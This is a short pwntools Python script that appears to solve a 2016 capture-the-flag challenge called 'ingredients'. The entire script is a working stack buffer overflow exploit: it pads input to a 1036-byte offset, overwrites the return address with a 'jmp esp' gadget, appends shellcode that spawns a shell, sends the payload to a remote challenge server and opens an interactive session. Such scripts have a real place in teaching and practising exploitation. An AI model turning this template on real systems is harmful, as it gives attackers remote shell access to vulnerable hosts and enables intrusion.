from pwn import *

context(arch = 'i386', os = 'linux')

PROGRAM = './ingredients'
#ELF(PROGRAM)

RETURN_ADDRESS = 0x08048679 # jmp esp

PAYLOAD = ""
buffer_filled = 0

RETURN_ADDRESS_OFFSET = 1032+4

while buffer_filled < RETURN_ADDRESS_OFFSET:
	PAYLOAD += 'aa\n'
	buffer_filled += 4

assert buffer_filled == RETURN_ADDRESS_OFFSET

PAYLOAD += flat(RETURN_ADDRESS)
PAYLOAD += asm(shellcraft.sh())
PAYLOAD += "\nend\n"

#p = process(PROGRAM)
p = remote("ctf2016.the-playground.dk", 12001)
p.recvuntil('Give me a list of ingredients separated by newline. End with a line matching "end".\n')
p.send(PAYLOAD)
p.recvline()
p.interactive()